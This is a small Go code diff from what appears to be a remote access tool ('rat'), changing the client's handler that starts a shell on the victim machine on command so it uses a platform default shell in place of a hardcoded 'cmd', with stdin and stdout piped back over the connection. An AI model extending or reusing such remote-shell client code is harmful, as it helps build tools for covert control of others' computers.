@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"io"
 	"os/exec"
+	"rat/client/shell"
 	"rat/common"
 )
 
@@ -32,7 +33,7 @@ func (packet ShellPacket) Read(c *Connection) error {
 
 	switch action {
 	case common.StartShell:
-		current.process = exec.Command("cmd")
+		current.process = exec.Command(shell.GetDefault())
 		current.stdin, _ = current.process.StdinPipe()
 		current.stdout, _ = current.process.StdoutPipe()
 
